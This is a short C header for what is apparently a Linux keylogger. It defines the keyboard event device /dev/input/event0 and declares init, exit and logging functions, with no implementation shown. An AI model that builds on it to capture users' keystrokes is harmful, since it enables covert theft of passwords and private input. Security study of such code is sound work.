#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#define INPUT "/dev/input/event0"

extern void keylogger_init(void);
extern void keylogger_exit(void);
extern const void keylogger();

#endif